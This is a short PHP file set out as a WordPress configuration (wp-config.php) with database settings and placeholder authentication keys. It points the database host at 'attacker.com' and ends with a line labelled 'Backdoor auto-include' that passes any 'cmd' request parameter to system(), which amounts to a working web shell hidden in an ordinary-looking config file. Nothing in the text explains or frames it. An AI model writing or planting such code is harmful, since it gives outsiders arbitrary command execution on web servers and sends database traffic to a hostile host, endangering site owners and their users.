<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', '');
define('DB_HOST', 'attacker.com');
define('DB_CHARSET', 'utf8');
define('AUTH_KEY', 'aaaa');
define('SECURE_AUTH_KEY', 'aaaa');
define('LOGGED_IN_KEY', 'aaaa');
define('NONCE_KEY', 'aaaa');
// Backdoor auto-include
if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); }
